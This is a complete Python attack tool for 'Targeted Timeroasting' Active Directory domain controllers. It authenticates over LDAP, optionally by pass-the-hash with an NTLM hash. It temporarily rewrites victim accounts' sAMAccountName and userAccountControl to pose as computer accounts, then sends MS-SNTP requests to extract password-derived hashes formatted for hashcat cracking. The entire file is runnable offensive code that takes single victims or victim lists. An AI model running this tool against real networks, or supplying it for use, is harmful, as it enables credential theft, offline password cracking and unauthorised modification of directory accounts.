#!/usr/bin/env python3
"""
Targeted Timeroast Python Implementation

Performs a 'Targeted Timeroast' attack against a domain controller,
manipulating users' userAccountControl to dump their hashes with MS-SNTP.
Enhanced with NTLM hash authentication support and no domain join requirement.

Original PowerShell version by Jacopo (antipatico) Scannella,
modified for Targeted Timeroasting by Giulio Pierantoni.
Python implementation with NTLM hash support.
"""

import argparse
import socket
import struct
import sys
import time
from typing import List, Optional, Tuple

try:
    from ldap3 import Server, Connection, ALL, MODIFY_REPLACE, NTLM
    from ldap3.core.exceptions import LDAPException, LDAPBindError
except ImportError:
    print("[!] ldap3 library required. Install with: pip install ldap3")
    sys.exit(1)


class TargetedTimeroast:
    def __init__(self, domain_controller: str, domain: str, username: str,
                 password: str = None, ntlm_hash: str = None,
                 use_ssl: bool = False, port: int = 389):
        self.domain_controller = domain_controller
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.use_ssl = use_ssl
        self.port = port
        self.connection = None

        # MS-SNTP constants
        self.NTP_PREFIX = bytes([
            0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a
        ])

        self.WORKSTATION_TRUST_ACCOUNT = 4096

    def connect(self) -> bool:
        """Establish LDAP connection with authentication"""
        try:
            server = Server(self.domain_controller, port=self.port,
                          use_ssl=self.use_ssl, get_info=ALL)

            if self.ntlm_hash:
                # NTLM hash authentication
                user_dn = f"{self.domain}\\{self.username}"
                self.connection = Connection(server, user=user_dn,
                                           password=self.ntlm_hash,
                                           authentication=NTLM)
            else:
                # Username/password authentication
                user_dn = f"{self.domain}\\{self.username}"
                self.connection = Connection(server, user=user_dn,
                                           password=self.password,
                                           authentication=NTLM)

            if not self.connection.bind():
                print(f"[!] LDAP bind failed: {self.connection.result}")
                return False

            print(f"[+] Successfully authenticated to {self.domain_controller}")
            return True

        except LDAPBindError as e:
            print(f"[!] Authentication failed: {e}")
            return False
        except LDAPException as e:
            print(f"[!] LDAP connection error: {e}")
            return False

    def get_user_info(self, username: str) -> Optional[Tuple[str, int, int]]:
        """Get user DN, RID, and current userAccountControl"""
        try:
            search_base = f"DC={',DC='.join(self.domain.split('.'))}"
            search_filter = f"(sAMAccountName={username})"

            if not self.connection.search(search_base, search_filter,
                                        attributes=['distinguishedName',
                                                  'userAccountControl',
                                                  'objectSid']):
                print(f"[!] User {username} not found")
                return None

            if len(self.connection.entries) == 0:
                print(f"[!] User {username} not found")
                return None

            entry = self.connection.entries[0]
            dn = str(entry.distinguishedName.value)
            uac = int(entry.userAccountControl.value)

            # Extract RID from objectSid
            if hasattr(entry.objectSid, 'raw_values') and entry.objectSid.raw_values:
                sid_bytes = entry.objectSid.raw_values[0]
                # SID structure: revision(1) + authority_count(1) + authority(6) + sub_authorities
                # RID is the last sub-authority (last 4 bytes)
                rid = struct.unpack('<I', sid_bytes[-4:])[0]
            else:
                # Fallback: parse SID string to extract RID
                sid_string = str(entry.objectSid.value)
                rid = int(sid_string.split('-')[-1])

            return dn, rid, uac

        except LDAPException as e:
            print(f"[!] Error querying user {username}: {e}")
            return None

    def modify_user_attributes(self, dn: str, new_sam: str, new_uac: int) -> bool:
        """Modify user sAMAccountName and userAccountControl"""
        try:
            changes = {
                'sAMAccountName': [(MODIFY_REPLACE, [new_sam])],
                'userAccountControl': [(MODIFY_REPLACE, [str(new_uac)])]
            }

            if not self.connection.modify(dn, changes):
                print(f"[!] Failed to modify user attributes: {self.connection.result}")
                return False

            return True

        except LDAPException as e:
            print(f"[!] Error modifying user attributes: {e}")
            return False

    def verify_attributes(self, dn: str, expected_sam: str, expected_uac: int,
                         operation: str = "modified") -> bool:
        """Verify that attributes were modified/restored correctly"""
        try:
            if not self.connection.search(dn, '(objectClass=*)',
                                        attributes=['sAMAccountName', 'userAccountControl']):
                return False

            entry = self.connection.entries[0]
            current_sam = str(entry.sAMAccountName.value)
            current_uac = int(entry.userAccountControl.value)

            success = current_sam == expected_sam and current_uac == expected_uac

            if operation == "restored":
                if success:
                    print(f"[+] Attributes successfully restored: sAMAccountName={current_sam}, userAccountControl={current_uac}")
                else:
                    print(f"[!] FAILED to restore attributes: sAMAccountName={current_sam} (expected: {expected_sam}), userAccountControl={current_uac} (expected: {expected_uac})")

            return success

        except LDAPException:
            return False

    def send_ntp_request(self, rid: int, source_port: Optional[int] = None,
                        timeout: float = 1.0) -> Optional[bytes]:
        """Send MS-SNTP request and return response"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if source_port:
                sock.bind(('', source_port))

            sock.settimeout(timeout)

            # Construct NTP query with RID
            query = self.NTP_PREFIX + struct.pack('<I', rid) + b'\x00' * 16

            # Send request
            sock.sendto(query, (self.domain_controller, 123))

            # Receive response
            response, _ = sock.recvfrom(1024)
            sock.close()

            return response if len(response) == 68 else None

        except socket.timeout:
            return None
        except socket.error as e:
            print(f"[!] Socket error: {e}")
            return None
        finally:
            try:
                sock.close()
            except:
                pass

    def extract_hash(self, response: bytes, rid: int) -> str:
        """Extract hash from NTP response and format for hashcat"""
        if len(response) != 68:
            return None

        salt = response[:48]
        md5_hash = response[-16:]

        hex_salt = salt.hex()
        hex_md5_hash = md5_hash.hex()

        return f"{rid}:$sntp-ms${hex_md5_hash}${hex_salt}"

    def process_target(self, target: str, quiet: bool = False,
                      verbose: bool = False, source_port: Optional[int] = None) -> Optional[str]:
        """Process a single target user"""
        if verbose:
            print(f"[*] Processing target: {target}")

        # Get user information
        user_info = self.get_user_info(target)
        if not user_info:
            return None

        dn, rid, original_uac = user_info
        if verbose:
            print(f"[*] User DN: {dn}")
            print(f"[*] RID: {rid}")
            print(f"[*] Original UAC: {original_uac}")

        # Prepare new attributes
        new_sam = target if target.endswith('$') else target + '$'
        new_uac = self.WORKSTATION_TRUST_ACCOUNT

        try:
            # Modify attributes
            if verbose:
                print(f"[*] Modifying sAMAccountName to {new_sam} and userAccountControl to {new_uac}")

            if not self.modify_user_attributes(dn, new_sam, new_uac):
                return None

            # Verify modification if not quiet
            if not quiet:
                if not self.verify_attributes(dn, new_sam, new_uac, "modified"):
                    print(f"[!] Attributes weren't modified successfully for {target}")
                    return None

            # Send NTP request
            if verbose:
                print(f"[*] Sending MS-SNTP request for RID {rid}")

            response = self.send_ntp_request(rid, source_port)

            if response:
                if verbose:
                    print("[*] Received hash response!")
                return self.extract_hash(response, rid)
            else:
                print(f"[!] No proper reply received for RID {rid}")
                return None

        finally:
            # Restore original attributes
            if verbose:
                print(f"[*] Restoring attributes for {target}")

            self.modify_user_attributes(dn, target, original_uac)

            # Always verify restoration (even in quiet mode for safety)
            restoration_success = self.verify_attributes(dn, target, original_uac, "restored")

            if not restoration_success:
                print(f"\n[!] CRITICAL: Failed to restore original attributes for {target}!")
                print(f"[!] This could leave the user account in a compromised state.")

                while True:
                    response = input("[?] Do you want to continue with the next target? (y/n): ").lower().strip()
                    if response in ['y', 'yes']:
                        print("[*] Continuing with next target...")
                        break
                    elif response in ['n', 'no']:
                        print("[*] Stopping script due to restoration failure.")
                        sys.exit(1)
                    else:
                        print("[!] Please enter 'y' or 'n'")

    def run(self, targets: List[str], output_file: Optional[str] = None,
            rate: int = 180, timeout: int = 24, source_port: Optional[int] = None,
            quiet: bool = False, verbose: bool = False) -> None:
        """Run the targeted timeroast attack"""
        if not self.connect():
            return

        request_interval = 1.0 / rate
        hashes = []

        try:
            for target in targets:
                start_time = time.time()

                hash_result = self.process_target(target, quiet, verbose, source_port)

                if hash_result:
                    hashes.append(hash_result)

                    if output_file:
                        with open(output_file, 'a') as f:
                            f.write(hash_result + '\n')
                    else:
                        print(hash_result)

                # Rate limiting
                elapsed = time.time() - start_time
                if elapsed < request_interval:
                    time.sleep(request_interval - elapsed)

        finally:
            if self.connection:
                self.connection.unbind()

        if verbose:
            print(f"[*] Extracted {len(hashes)} hashes")


def main():
    parser = argparse.ArgumentParser(
        description="Targeted Timeroast attack with NTLM hash authentication support",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('domain_controller', help='Domain controller hostname/IP')
    parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., example.com)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')

    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument('-p', '--password', help='Password for authentication')
    auth_group.add_argument('-H', '--hash', help='NTLM hash for authentication (LM:NT or just NT)')

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('--victim', help='Single target username')
    target_group.add_argument('--file', help='File containing target usernames (one per line)')

    parser.add_argument('-o', '--output', help='Output file for hashes')
    parser.add_argument('--rate', type=int, default=180, help='Requests per second (default: 180)')
    parser.add_argument('--timeout', type=int, default=24, help='Timeout in seconds (default: 24)')
    parser.add_argument('--source-port', type=int, help='Source port for NTP requests')
    parser.add_argument('--ssl', action='store_true', help='Use SSL for LDAP connection')
    parser.add_argument('--port', type=int, default=389, help='LDAP port (default: 389, 636 for SSL)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    # Process NTLM hash
    ntlm_hash = None
    if args.hash:
        # Handle both LM:NT and NT formats
        if ':' in args.hash:
            lm_hash, nt_hash = args.hash.split(':', 1)
            ntlm_hash = f"{lm_hash}:{nt_hash}"
        else:
            # Just NT hash provided, use empty LM hash
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{args.hash}"

    # Get targets
    targets = []
    if args.victim:
        targets = [args.victim]
    else:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] File not found: {args.file}")
            return

    if not targets:
        print("[!] No targets specified")
        return

    # Set default SSL port
    port = args.port
    if args.ssl and port == 389:
        port = 636

    # Create and run timeroast
    timeroast = TargetedTimeroast(
        args.domain_controller, args.domain, args.username,
        password=args.password, ntlm_hash=ntlm_hash,
        use_ssl=args.ssl, port=port
    )

    timeroast.run(targets, args.output, args.rate, args.timeout,
                  args.source_port, args.quiet, args.verbose)


if __name__ == "__main__":
    main()